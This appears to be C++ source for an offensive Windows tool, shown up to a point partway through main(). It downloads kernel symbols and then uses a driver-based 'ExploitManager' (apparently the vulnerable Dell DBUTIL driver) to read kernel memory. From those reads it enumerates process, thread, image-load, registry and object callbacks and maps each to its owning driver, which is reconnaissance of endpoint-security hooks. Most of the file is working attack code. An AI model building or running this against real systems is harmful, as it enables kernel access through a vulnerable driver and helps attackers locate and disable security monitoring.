#include "main.h"

PBYTE ReadFullFileW(LPCWSTR fileName) {
	HANDLE hFile = CreateFileW(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return NULL;
	}
	DWORD fileSize = GetFileSize(hFile, NULL);
	PBYTE fileContent = (PBYTE)malloc(fileSize); // cast
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, fileContent, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
		free(fileContent);
		fileContent = NULL;
	}
	CloseHandle(hFile);
	return fileContent;
}

IMAGE_SECTION_HEADER* PE_sectionHeader_fromRVA(PE* pe, DWORD rva) {
	IMAGE_SECTION_HEADER* sectionHeaders = pe->sectionHeaders;
	for (DWORD sectionIndex = 0; sectionIndex < pe->ntHeader->FileHeader.NumberOfSections; sectionIndex++) {
		DWORD currSectionVA = sectionHeaders[sectionIndex].VirtualAddress;
		DWORD currSectionVSize = sectionHeaders[sectionIndex].Misc.VirtualSize;
		if (currSectionVA <= rva && rva < currSectionVA + currSectionVSize) {
			return &sectionHeaders[sectionIndex];
		}
	}
	return NULL;
}

PVOID PE_RVA_to_Addr(PE* pe, DWORD rva) {
	PVOID peBase = pe->dosHeader;
	if (pe->isMemoryMapped) {
		return (PBYTE)peBase + rva;
	}

	IMAGE_SECTION_HEADER* rvaSectionHeader = PE_sectionHeader_fromRVA(pe, rva);
	if (NULL == rvaSectionHeader) {
		return NULL;
	}
	else {
		return (PBYTE)peBase + rvaSectionHeader->PointerToRawData + (rva - rvaSectionHeader->VirtualAddress);
	}
}

PE* PE_create(PVOID imageBase, BOOL isMemoryMapped) {
	PE* pe = (PE*)calloc(1, sizeof(PE));
	if (NULL == pe) {
		exit(1);
	}
	pe->isMemoryMapped = isMemoryMapped;
	pe->isInAnotherAddressSpace = FALSE;
	pe->hProcess = INVALID_HANDLE_VALUE;
	pe->dosHeader = (IMAGE_DOS_HEADER*)imageBase; // cast
	pe->ntHeader = (IMAGE_NT_HEADERS*)(((PBYTE)imageBase) + pe->dosHeader->e_lfanew);
	pe->optHeader = &pe->ntHeader->OptionalHeader;
	if (isMemoryMapped) {
		pe->baseAddress = imageBase;
	}
	else {
		pe->baseAddress = (PVOID)pe->optHeader->ImageBase;
	}
	pe->dataDir = pe->optHeader->DataDirectory;
	pe->sectionHeaders = (IMAGE_SECTION_HEADER*)(((PBYTE)pe->optHeader) + pe->ntHeader->FileHeader.SizeOfOptionalHeader);
	DWORD exportRVA = pe->dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportRVA == 0) {
		pe->exportDirectory = NULL;
		pe->exportedNames = NULL;
		pe->exportedFunctions = NULL;
		pe->exportedOrdinals = NULL;
	}
	else {
		pe->exportDirectory = (IMAGE_EXPORT_DIRECTORY*)PE_RVA_to_Addr(pe, exportRVA);
		pe->exportedNames = (LPDWORD)PE_RVA_to_Addr(pe, pe->exportDirectory->AddressOfNames);
		pe->exportedFunctions = (LPDWORD)PE_RVA_to_Addr(pe, pe->exportDirectory->AddressOfFunctions);
		pe->exportedOrdinals = (LPWORD)PE_RVA_to_Addr(pe, pe->exportDirectory->AddressOfNameOrdinals);
		pe->exportedNamesLength = pe->exportDirectory->NumberOfNames;
	}
	pe->relocations = NULL;
	DWORD debugRVA = pe->dataDir[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
	if (debugRVA == 0) {
		pe->debugDirectory = NULL;
	}
	else {
		pe->debugDirectory = (IMAGE_DEBUG_DIRECTORY*)PE_RVA_to_Addr(pe, debugRVA);
		if (pe->debugDirectory->Type != IMAGE_DEBUG_TYPE_CODEVIEW) {
			pe->debugDirectory = NULL;
		}
		else {
			pe->codeviewDebugInfo = (PE_codeview_debug_info*)PE_RVA_to_Addr(pe, pe->debugDirectory->AddressOfRawData);
			if (pe->codeviewDebugInfo->signature != *((DWORD*)"RSDS")) {
				pe->debugDirectory = NULL;
				pe->codeviewDebugInfo = NULL;
			}
		}
	}
	return pe;
}

VOID PE_destroy(PE* pe)
{
	if (pe->relocations) {
		free(pe->relocations);
		pe->relocations = NULL;
	}
	free(pe);
}

BOOL FileExistsW(LPCWSTR szPath)
{
	DWORD dwAttrib = GetFileAttributesW(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL WriteFullFileW(LPCWSTR fileName, PBYTE fileContent, SIZE_T fileSize) {
	HANDLE hFile = CreateFileW(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}
	BOOL res = WriteFile(hFile, fileContent, (DWORD)fileSize, NULL, NULL);
	CloseHandle(hFile);
	return res;
}

BOOL HttpsDownloadFullFile(LPCWSTR domain, LPCWSTR uri, PBYTE* output, SIZE_T* output_size) {
	///wprintf_or_not(L"Downloading https://%s%s...\n", domain, uri);
	// Get proxy configuration
	WINHTTP_CURRENT_USER_IE_PROXY_CONFIG proxyConfig;
	WinHttpGetIEProxyConfigForCurrentUser(&proxyConfig);
	BOOL proxySet = !(proxyConfig.fAutoDetect || proxyConfig.lpszAutoConfigUrl != NULL);
	DWORD proxyAccessType = proxySet ? ((proxyConfig.lpszProxy == NULL) ?
		WINHTTP_ACCESS_TYPE_NO_PROXY : WINHTTP_ACCESS_TYPE_NAMED_PROXY) : WINHTTP_ACCESS_TYPE_NO_PROXY;
	LPCWSTR proxyName = proxySet ? proxyConfig.lpszProxy : WINHTTP_NO_PROXY_NAME;
	LPCWSTR proxyBypass = proxySet ? proxyConfig.lpszProxyBypass : WINHTTP_NO_PROXY_BYPASS;

	// Initialize HTTP session and request
	HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.0", proxyAccessType, proxyName, proxyBypass, 0);
	if (hSession == NULL) {
		printf("WinHttpOpen failed with error : 0x%x\n", GetLastError());
		return FALSE;
	}
	HINTERNET hConnect = WinHttpConnect(hSession, domain, INTERNET_DEFAULT_HTTPS_PORT, 0);
	if (!hConnect) {
		printf("WinHttpConnect failed with error : 0x%x\n", GetLastError());
		return FALSE;
	}
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", uri, NULL,
		WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
	if (!hRequest) {
		return FALSE;
	}

	// Configure proxy manually
	if (!proxySet)
	{
		WINHTTP_AUTOPROXY_OPTIONS  autoProxyOptions;
		autoProxyOptions.dwFlags = proxyConfig.lpszAutoConfigUrl != NULL ? WINHTTP_AUTOPROXY_CONFIG_URL : WINHTTP_AUTOPROXY_AUTO_DETECT;
		autoProxyOptions.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
		autoProxyOptions.fAutoLogonIfChallenged = TRUE;

		if (proxyConfig.lpszAutoConfigUrl != NULL)
			autoProxyOptions.lpszAutoConfigUrl = proxyConfig.lpszAutoConfigUrl;

		WCHAR szUrl[MAX_PATH] = { 0 };
		swprintf_s(szUrl, _countof(szUrl), L"https://%ws%ws", domain, uri);

		WINHTTP_PROXY_INFO proxyInfo;
		WinHttpGetProxyForUrl(
			hSession,
			szUrl,
			&autoProxyOptions,
			&proxyInfo);

		WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &proxyInfo, sizeof(proxyInfo));
		DWORD logonPolicy = WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW;
		WinHttpSetOption(hRequest, WINHTTP_OPTION_AUTOLOGON_POLICY, &logonPolicy, sizeof(logonPolicy));
	}

	// Perform request
	BOOL bRequestSent;
	do {
		bRequestSent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	} while (!bRequestSent && GetLastError() == ERROR_WINHTTP_RESEND_REQUEST);
	if (!bRequestSent) {
		return FALSE;
	}
	BOOL bResponseReceived = WinHttpReceiveResponse(hRequest, NULL);
	if (!bResponseReceived) {
		return FALSE;
	}

	// Read response
	DWORD dwAvailableSize = 0;
	DWORD dwDownloadedSize = 0;
	SIZE_T allocatedSize = 4096;
	if (!WinHttpQueryDataAvailable(hRequest, &dwAvailableSize))
	{
		return FALSE;
	}
	*output = (PBYTE)malloc(allocatedSize);
	*output_size = 0;
	while (dwAvailableSize)
	{
		while (*output_size + dwAvailableSize > allocatedSize) {
			allocatedSize *= 2;
			PBYTE new_output = (PBYTE)realloc(*output, allocatedSize);
			if (new_output == NULL)
			{
				return FALSE;
			}
			*output = new_output;
		}
		if (!WinHttpReadData(hRequest, *output + *output_size, dwAvailableSize, &dwDownloadedSize))
		{
			return FALSE;
		}
		*output_size += dwDownloadedSize;

		WinHttpQueryDataAvailable(hRequest, &dwAvailableSize);
	}
	PBYTE new_output = (PBYTE)realloc(*output, *output_size);
	if (new_output == NULL)
	{
		return FALSE;
	}
	*output = new_output;
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);
	return TRUE;
}

BOOL DownloadPDB(GUID guid, DWORD age, LPCWSTR pdb_name_w, PBYTE* file, SIZE_T* file_size) {
	WCHAR full_pdb_uri[MAX_PATH] = { 0 };
	swprintf_s(full_pdb_uri, _countof(full_pdb_uri), L"/download/symbols/%s/%08X%04hX%04hX%016llX%X/%s", pdb_name_w, guid.Data1, guid.Data2, guid.Data3, _byteswap_uint64(*((DWORD64*)guid.Data4)), age, pdb_name_w);
	return HttpsDownloadFullFile(L"msdl.microsoft.com", full_pdb_uri, file, file_size);
}

BOOL DownloadPDBFromPE(PE* image_pe, PBYTE* file, SIZE_T* file_size) {
	WCHAR pdb_name_w[MAX_PATH] = { 0 };
	GUID guid = image_pe->codeviewDebugInfo->guid;
	DWORD age = image_pe->codeviewDebugInfo->age;
	MultiByteToWideChar(CP_UTF8, 0, image_pe->codeviewDebugInfo->pdbName, -1, pdb_name_w, _countof(pdb_name_w));
	return DownloadPDB(guid, age, pdb_name_w, file, file_size);
}

symbol_ctx* LoadSymbolsFromPE(PE* pe) {
	symbol_ctx* ctx = (symbol_ctx*)calloc(1, sizeof(symbol_ctx));
	if (ctx == NULL) {
		return NULL;
	}
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, pe->codeviewDebugInfo->pdbName, -1, NULL, 0);
	ctx->pdb_name_w = (LPWSTR)calloc(size_needed, sizeof(WCHAR));
	MultiByteToWideChar(CP_UTF8, 0, pe->codeviewDebugInfo->pdbName, -1, ctx->pdb_name_w, size_needed);
	if (!FileExistsW(ctx->pdb_name_w)) {
		PBYTE file;
		SIZE_T file_size;
		BOOL res = DownloadPDBFromPE(pe, &file, &file_size);
		if (!res) {
			free(ctx);
			return NULL;
		}
		WriteFullFileW(ctx->pdb_name_w, file, file_size);
		free(file);
	}
	else {
		//TODO : check if exisiting PDB corresponds to the file version
	}
	DWORD64 asked_pdb_base_addr = 0x1337000;
	DWORD pdb_image_size = MAXDWORD;
	HANDLE cp = GetCurrentProcess();
	if (!SymInitialize(cp, NULL, FALSE)) {
		free(ctx);
		return NULL;
	}
	ctx->sym_handle = cp;

	DWORD64 pdb_base_addr = SymLoadModuleExW(cp, NULL, ctx->pdb_name_w, NULL, asked_pdb_base_addr, pdb_image_size, NULL, 0);
	while (pdb_base_addr == 0) {
		DWORD err = GetLastError();
		if (err == ERROR_SUCCESS)
			break;
		if (err == ERROR_FILE_NOT_FOUND) {
			printf("PDB file not found\n");
			SymUnloadModule(cp, asked_pdb_base_addr);//TODO : fix handle leak
			SymCleanup(cp);
			free(ctx);
			return NULL;
		}
		printf("SymLoadModuleExW, error 0x%x\n", GetLastError());
		asked_pdb_base_addr += 0x1000000;
		pdb_base_addr = SymLoadModuleExW(cp, NULL, ctx->pdb_name_w, NULL, asked_pdb_base_addr, pdb_image_size, NULL, 0);
	}
	ctx->pdb_base_addr = pdb_base_addr;
	return ctx;
}

symbol_ctx* LoadSymbolsFromImageFile(LPCWSTR image_file_path) {
	PVOID image_content = ReadFullFileW(image_file_path);
	PE* pe = PE_create(image_content, FALSE);
	symbol_ctx* ctx = LoadSymbolsFromPE(pe);
	PE_destroy(pe);
	free(image_content);
	return ctx;
}
// Save till here

DWORD64 GetSymbolOffset(symbol_ctx* ctx, LPCSTR symbol_name) {
	SYMBOL_INFO_PACKAGE si = { 0 };
	si.si.SizeOfStruct = sizeof(SYMBOL_INFO);
	si.si.MaxNameLen = sizeof(si.name);
	BOOL res = SymGetTypeFromName(ctx->sym_handle, ctx->pdb_base_addr, symbol_name, &si.si);
	if (res) {
		return si.si.Address - ctx->pdb_base_addr;
	}
	else {
		return 0;
	}
}

DWORD GetFieldOffset(symbol_ctx* ctx, LPCSTR struct_name, LPCWSTR field_name) {
	SYMBOL_INFO_PACKAGE si = { 0 };
	si.si.SizeOfStruct = sizeof(SYMBOL_INFO);
	si.si.MaxNameLen = sizeof(si.name);
	BOOL res = SymGetTypeFromName(ctx->sym_handle, ctx->pdb_base_addr, struct_name, &si.si);
	if (!res) {
		return 0;
	}

	TI_FINDCHILDREN_PARAMS* childrenParam = (TI_FINDCHILDREN_PARAMS*)calloc(1, sizeof(TI_FINDCHILDREN_PARAMS));
	if (childrenParam == NULL) {
		return 0;
	}

	res = SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, si.si.TypeIndex, TI_GET_CHILDRENCOUNT, &childrenParam->Count);
	if (!res) {
		return 0;
	}
	TI_FINDCHILDREN_PARAMS* ptr = (TI_FINDCHILDREN_PARAMS*)realloc(childrenParam, sizeof(TI_FINDCHILDREN_PARAMS) + childrenParam->Count * sizeof(ULONG));
	if (ptr == NULL) {
		free(childrenParam);
		return 0;
	}
	childrenParam = ptr;
	res = SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, si.si.TypeIndex, TI_FINDCHILDREN, childrenParam);
	DWORD offset = 0;
	for (ULONG i = 0; i < childrenParam->Count; i++) {
		ULONG childID = childrenParam->ChildId[i];
		WCHAR* name = NULL;
		SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, childID, TI_GET_SYMNAME, &name);
		if (wcscmp(field_name, name)) {
			continue;
		}
		SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, childID, TI_GET_OFFSET, &offset);
		break;
	}
	free(childrenParam);
	return offset;
}

void UnloadSymbols(symbol_ctx* ctx, BOOL delete_pdb) {
	SymUnloadModule(ctx->sym_handle, ctx->pdb_base_addr);
	SymCleanup(ctx->sym_handle);
	if (delete_pdb) {
		DeleteFileW(ctx->pdb_name_w);
	}
	free(ctx->pdb_name_w);
	ctx->pdb_name_w = NULL;
	free(ctx);
}

void FindDriver(DWORD64 address) {

	LPVOID drivers[1024];
	DWORD cbNeeded;
	int cDrivers, i;
	DWORD64 diff[3][200];
	TCHAR szDriver[1024];

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
		int n = sizeof(drivers) / sizeof(drivers[0]);
		cDrivers = cbNeeded / sizeof(drivers[0]);
		int narrow = 0;
		int c = 0;
		for (i = 0; i < cDrivers; i++) {
			//we add all smaller addresses of drivers to a new array, then grab the closest. Not great, I know...
			if (address > (DWORD64)drivers[i]) {
				diff[0][c] = address;
				diff[1][c] = address - (DWORD64)drivers[i];
				diff[2][c] = (DWORD64)drivers[i];
				c++;
			}
		}
	}
	//cheeky for loop to find the smallest diff. smallest diff should be the diff of DriverBase + Diff == Callback function.
	int k = 0;
	DWORD64 temp = diff[1][0];
	for (k = 0; k < cDrivers; k++) {
		if ((temp > diff[1][k]) && (diff[0][k] == address)) {
			temp = diff[1][k];

		}
	}

	if (GetDeviceDriverBaseName(LPVOID(address - temp), szDriver, sizeof(szDriver))) {
		std::cout << "[+] " << std::hex << address << " [";
		std::wcout << szDriver << " + 0x";
		std::cout << std::hex << (int)temp;
		std::cout << "]" << std::endl;
	}
	else {
		printf("[!] Could not resolve driver for %p\n", address);
	}

}

void EnumAllObjectsCallbacks(DBUTIL* ExploitManager, DWORD64 ntoskrnlBaseAddress) {
	LPTSTR ntoskrnlPath;
	TCHAR g_ntoskrnlPath[MAX_PATH] = { 0 };
	_tcscat_s(g_ntoskrnlPath, _countof(g_ntoskrnlPath), TEXT("C:\\Windows\\System32\\ntoskrnl.exe"));
	ntoskrnlPath = g_ntoskrnlPath;
	// get object types count
	/*if (!Offset__OBJECT_TYPE_Name) { // yes->Symbols and offsets already loaded
	}*/
	symbol_ctx* sym_ctx = LoadSymbolsFromImageFile(ntoskrnlPath);
	if (sym_ctx == NULL) {
		printf("Symbols not available, download failed, aborting...\n");
		exit(1);
	}
	else {
		printf("[+] Symbols and Offsets now available!\n");
	}

	GET_OFFSET(_OBJECT_TYPE, Name);
	GET_OFFSET(_OBJECT_TYPE, TotalNumberOfObjects);
	GET_OFFSET(_OBJECT_TYPE, TypeInfo);
	GET_OFFSET(_OBJECT_TYPE_INITIALIZER, ObjectTypeFlags);
	GET_SYMBOL(ObpObjectTypes);
	GET_SYMBOL(ObpTypeObjectType);
	GET_SYMBOL(PspCreateProcessNotifyRoutine);
	GET_SYMBOL(PspLoadImageNotifyRoutine);
	GET_SYMBOL(PspCreateThreadNotifyRoutine);
	GET_SYMBOL(CallbackListHead);
	GET_OFFSET(_UNICODE_STRING, MaximumLength);
	GET_OFFSET(_UNICODE_STRING, Buffer);
	GET_OFFSET(_OBJECT_TYPE, CallbackList);
	GET_OFFSET(_OBJECT_TYPE_INITIALIZER, ObjectTypeFlags);
	GET_OFFSET(_OBJECT_TYPE_INITIALIZER, DumpProcedure);
	GET_OFFSET(_OBJECT_TYPE_INITIALIZER, OpenProcedure);
	GET_OFFSET(_OBJECT_TYPE_INITIALIZER, CloseProcedure);
	GET_OFFSET(_OBJECT_TYPE_INITIALIZER, DeleteProcedure);
	GET_OFFSET(_OBJECT_TYPE_INITIALIZER, ParseProcedure);
	GET_OFFSET(_OBJECT_TYPE_INITIALIZER, SecurityProcedure);
	GET_OFFSET(_OBJECT_TYPE_INITIALIZER, QueryNameProcedure);
	GET_OFFSET(_OBJECT_TYPE_INITIALIZER, OkayToCloseProcedure);
	//UnloadSymbols(sym_ctx, false);
	unsigned long long buffer[3];

	/*printf("Symbol ObpTypeObjectType: 0x%llx\n", Sym_ObpTypeObjectType);
	printf("PspCreateProcessNotifyRoutine at: 0x%llx\n", Sym_PspCreateProcessNotifyRoutine);
	printf("PspCreateProcessNotifyRoutine at: 0x%llx\n", Sym_PspLoadImageNotifyRoutine);
	printf("CallbackListHead at: 0x%llx\n", Sym_CallbackListHead);*/
	//ExploitManager->VirtualRead(*buffer + Offset__UNICODE_STRING_MaximumLength, &buffer, 1);
	//DWORD Offset__UNICODE_STRING_MaximumLength = *buffer;
	/*printf("Offset__OBJECT_TYPE_MaximumLength: 0x%llx\n", Offset__UNICODE_STRING_MaximumLength);
	printf("Offset__OBJECT_TYPE_CallbackList: 0x%llx\n", Offset__OBJECT_TYPE_CallbackList);
	printf("Offset__OBJECT_TYPE_TypeInfo: 0x%llx\n", Offset__OBJECT_TYPE_TypeInfo);
	printf("Offset__OBJECT_TYPE_INITIALIZER_ObjectTypeFlags: 0x%llx\n", Offset__OBJECT_TYPE_INITIALIZER_ObjectTypeFlags);
	printf("Offset__OBJECT_TYPE_INITIALIZER_DumpProcedure: 0x%llx\n", Offset__OBJECT_TYPE_INITIALIZER_DumpProcedure);
	printf("Offset__OBJECT_TYPE_OpenProcedure: 0x%llx\n", Offset__OBJECT_TYPE_INITIALIZER_OpenProcedure);
	printf("Offset__OBJECT_TYPE_INITIALIZER_CloseProcedure: 0x%llx\n", Offset__OBJECT_TYPE_INITIALIZER_CloseProcedure);
	printf("Offset__OBJECT_TYPE_INITIALIZER_ParseProcedure: 0x%llx\n", Offset__OBJECT_TYPE_INITIALIZER_ParseProcedure);
	printf("Offset__OBJECT_TYPE_INITIALIZER_SecurityProcedure: 0x%llx\n", Offset__OBJECT_TYPE_INITIALIZER_SecurityProcedure);
	printf("Offset__OBJECT_TYPE_INITIALIZER_QueryNameProcedure: 0x%llx\n", Offset__OBJECT_TYPE_INITIALIZER_QueryNameProcedure);
	printf("Offset__OBJECT_TYPE_INITIALIZER_OkayToCloseProcedure: 0x%llx\n", Offset__OBJECT_TYPE_INITIALIZER_OkayToCloseProcedure);*/

	printf("[+] Process creation callbacks:\n");
	for (int i = 0; i < 64; i++) {
		unsigned long long PspCreateProcessNotifyRoutineAddr = ntoskrnlBaseAddress + Sym_PspCreateProcessNotifyRoutine;
		PspCreateProcessNotifyRoutineAddr = PspCreateProcessNotifyRoutineAddr + (i * 8);
		ExploitManager->VirtualRead(PspCreateProcessNotifyRoutineAddr, &buffer, 8);
		unsigned long long CurrentCallbackAddress = *buffer;
		if ((DWORD64)CurrentCallbackAddress == 0)
			continue;
		CurrentCallbackAddress &= ~(1ULL << 3) + 0x1;
		//printf("Bit-Operation: 0x%llx\n", CurrentCallbackAddress); // more simple....just SUBSTRACT 0x7 !!!!!!
		ExploitManager->VirtualRead(CurrentCallbackAddress, &buffer, 8);
		CurrentCallbackAddress = *buffer;
		printf("\t");
		FindDriver(CurrentCallbackAddress);
	}

	printf("[+] Load image callbacks:\n");
	for (int i = 0; i < 64; i++) {
		unsigned long long PspLoadImageNotifyRoutineAddr = ntoskrnlBaseAddress + Sym_PspLoadImageNotifyRoutine;
		PspLoadImageNotifyRoutineAddr = PspLoadImageNotifyRoutineAddr + (i * 8);
		ExploitManager->VirtualRead(PspLoadImageNotifyRoutineAddr, &buffer, 8);
		unsigned long long CurrentCallbackAddress = *buffer;
		if ((DWORD64)CurrentCallbackAddress == 0)
			continue;
		CurrentCallbackAddress &= ~(1ULL << 3) + 0x1;
		ExploitManager->VirtualRead(CurrentCallbackAddress, &buffer, 8);
		CurrentCallbackAddress = *buffer;
		printf("\t");
		FindDriver(CurrentCallbackAddress);
	}

	printf("[+] Thread creation callbacks:\n");
	for (int i = 0; i < 64; i++) {
		unsigned long long PspCreateThreadNotifyRoutineAddr = ntoskrnlBaseAddress + Sym_PspCreateThreadNotifyRoutine;
		PspCreateThreadNotifyRoutineAddr = PspCreateThreadNotifyRoutineAddr + (i * 8);
		ExploitManager->VirtualRead(PspCreateThreadNotifyRoutineAddr, &buffer, 8);
		unsigned long long CurrentCallbackAddress = *buffer;
		if ((DWORD64)CurrentCallbackAddress == 0)
			continue;
		CurrentCallbackAddress &= ~(1ULL << 3) + 0x1;
		ExploitManager->VirtualRead(CurrentCallbackAddress, &buffer, 8);
		CurrentCallbackAddress = *buffer;
		printf("\t");
		FindDriver(CurrentCallbackAddress);
	}

	printf("[+] Registry R/W callbacks:\n");
	unsigned long long CallbackListHeadAddr = ntoskrnlBaseAddress + Sym_CallbackListHead;
	ExploitManager->VirtualRead(CallbackListHeadAddr, &buffer, 8);
	unsigned long long CurrentCallbackAddress = *buffer;
	unsigned long long callback = CurrentCallbackAddress;
	do {
		ExploitManager->ReadMemory((CurrentCallbackAddress+0x8)+(8*4), &buffer, 8);
		callback = *buffer;
		printf("\t");
		FindDriver(callback);
		ExploitManager->ReadMemory(CurrentCallbackAddress, &buffer, 8);
		CurrentCallbackAddress = *buffer;
	} while (CurrentCallbackAddress != CallbackListHeadAddr);

	ExploitManager->VirtualRead(ntoskrnlBaseAddress + Sym_ObpTypeObjectType, &buffer, 8);
	//printf("Dereferenced ObpTypeObjectType: 0x%llx\n", *buffer);
	if (*buffer == 0x0) {
		printf("[!]Error reading physical memory. Is driver running? Rerun program!\n");
		exit(1);
	}
	unsigned long long ntoskrnl_OBJECT_TYPE = *buffer;

	//printf("Next read at: 0x%llx\n", *buffer + Offset__OBJECT_TYPE_TotalNumberOfObjects);
	ExploitManager->VirtualRead(*buffer + Offset__OBJECT_TYPE_TotalNumberOfObjects, &buffer, 1);
	uint8_t ntoskrnl_OBJECT_TYPE_TotalNumberOfObject = *buffer;
	unsigned long long ObjectType;

	for (DWORD i = 0; i < (DWORD)ntoskrnl_OBJECT_TYPE_TotalNumberOfObject; i++) {
		//printf("Next read at: 0x%llx\n", ntoskrnlBaseAddress + Sym_ObpObjectTypes + i * sizeof(DWORD64));
		ExploitManager->ReadMemory(ntoskrnlBaseAddress + Sym_ObpObjectTypes + i * sizeof(DWORD64), &buffer, 8);
		ObjectType = *buffer;
		//printf("ObjectType at: 0x%llx\n", ObjectType);
		ExploitManager->ReadMemory(ObjectType + Offset__OBJECT_TYPE_Name + Offset__UNICODE_STRING_MaximumLength, &buffer, 8); // ? read maximum length
		uint8_t maxNameLength = *buffer;
		ExploitManager->ReadMemory(ObjectType + Offset__OBJECT_TYPE_Name + Offset__UNICODE_STRING_Buffer, &buffer, 8);
		WCHAR typeName[256] = { 0 }; // TODO: NOP change to dynamic allocation
		ExploitManager->ReadMemory(*buffer, typeName, maxNameLength);
		printf("[+] Object Type Name: %ls\n", typeName);
		ExploitManager->ReadMemory(ObjectType + Offset__OBJECT_TYPE_CallbackList, &buffer, 8);
		unsigned long long ObjectType_Callbacks_List = *buffer;
		DWORD64 supportsObjectCallback = ObjectType + Offset__OBJECT_TYPE_TypeInfo + Offset__OBJECT_TYPE_INITIALIZER_ObjectTypeFlags;
		DWORD64 dumpProcedure = ObjectType + Offset__OBJECT_TYPE_TypeInfo + Offset__OBJECT_TYPE_INITIALIZER_DumpProcedure;
		DWORD64 openProcedure = ObjectType + Offset__OBJECT_TYPE_TypeInfo + Offset__OBJECT_TYPE_INITIALIZER_OpenProcedure;
		DWORD64 closeProcedure = ObjectType + Offset__OBJECT_TYPE_TypeInfo + Offset__OBJECT_TYPE_INITIALIZER_CloseProcedure;
		DWORD64 deleteProcedure = ObjectType + Offset__OBJECT_TYPE_TypeInfo + Offset__OBJECT_TYPE_INITIALIZER_DeleteProcedure;
		DWORD64 parseProcedure = ObjectType + Offset__OBJECT_TYPE_TypeInfo + Offset__OBJECT_TYPE_INITIALIZER_ParseProcedure; // also ParseProcedureEx
		DWORD64 securityProcedure = ObjectType + Offset__OBJECT_TYPE_TypeInfo + Offset__OBJECT_TYPE_INITIALIZER_SecurityProcedure;
		DWORD64 queryNameProcedure = ObjectType + Offset__OBJECT_TYPE_TypeInfo + Offset__OBJECT_TYPE_INITIALIZER_QueryNameProcedure;
		DWORD64 okayToCloseProcedure = ObjectType + Offset__OBJECT_TYPE_TypeInfo + Offset__OBJECT_TYPE_INITIALIZER_OkayToCloseProcedure;
		ExploitManager->ReadMemory(supportsObjectCallback, &buffer, 4);
		supportsObjectCallback = *buffer;
		DWORD64 mask = 1ULL << 6;
		bool sixth_bit = (supportsObjectCallback & mask) != 0;
		if (!sixth_bit)
			continue; // Doesnt Supported Callbacks
		ExploitManager->ReadMemory(dumpProcedure, &buffer, 8);
		dumpProcedure = *buffer;
		if (dumpProcedure)
			printf("\tDumpProcedure:"); FindDriver(dumpProcedure);//printf("\t[+] DumpProcedure: 0x%llx\n", dumpProcedure);

		ExploitManager->ReadMemory(openProcedure, &buffer, 8);
		openProcedure = *buffer;
		if (openProcedure)
			printf("\tOpenProcedure:"); FindDriver(openProcedure);//printf("\t[+] OpenProcedure: 0x%llx\n", openProcedure);

		ExploitManager->ReadMemory(closeProcedure, &buffer, 8);
		closeProcedure = *buffer;
		if (closeProcedure)
			printf("\tCloseProcedure:"); FindDriver(closeProcedure);//printf("\t[+] CloseProcedure: 0x%llx\n", closeProcedure);

		ExploitManager->ReadMemory(deleteProcedure, &buffer, 8);
		deleteProcedure = *buffer;
		if (deleteProcedure)
			printf("\tDeleteProcedure:"); FindDriver(deleteProcedure);//printf("\t[+] DeleteProcedure: 0x%llx\n", deleteProcedure);

		ExploitManager->ReadMemory(parseProcedure, &buffer, 8);
		parseProcedure = *buffer;
		if (parseProcedure)
			printf("\tParseProcedure:"); FindDriver(parseProcedure);//printf("\t[+] ParseProcedure: 0x%llx\n", securityProcedure);

		ExploitManager->ReadMemory(securityProcedure, &buffer, 8);
		securityProcedure = *buffer;
		if (securityProcedure)
			printf("\tSecurityProcedure:"); FindDriver(securityProcedure);//printf("\t[+] SecurityProcedure: 0x%llx\n", securityProcedure);

		ExploitManager->ReadMemory(queryNameProcedure, &buffer, 8);
		queryNameProcedure = *buffer;
		if (queryNameProcedure)
			printf("\tQueryNameProcedure:"); FindDriver(queryNameProcedure);//printf("\t[+] QueryNameProcedure: 0x%llx\n", queryNameProcedure);

		ExploitManager->ReadMemory(okayToCloseProcedure, &buffer, 8);
		okayToCloseProcedure = *buffer;
		if (okayToCloseProcedure)
			printf("\t"); FindDriver(okayToCloseProcedure);//printf("\t[+] OkayToCloseProcedure: 0x%llx\n", okayToCloseProcedure);
	}

	printf("----------------\n\tThe quiter you are the more youre able to hear!\n----------------\n");
	return;
}

int main() {

	DBUTIL* ExploitManager = new DBUTIL();
	DWORD64 ntoskrnlBaseAddress = ExploitManager->GetKernelBase("ntoskrnl.exe");
	printf("[+] Base address of ntoskrnl.exe: 0x%llx\n", ntoskrnlBaseAddress);

	HMODULE Ntoskrnl = LoadLibraryExA("Ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (Ntoskrnl == NULL) {
		printf("[!] Unable to load Ntoskrnl.exe: %lu\n", GetLastError());
		return 0;
	}

	LPVOID pSymbol = GetProcAddress(Ntoskrnl, "KeInsertQueueApc");
	if (pSymbol == NULL) {
		printf("[!] Unable to find address of exported KeInsertQueueApc: %lu\n", GetLastError());
		return 0;
	}
	DWORD distance = 0;
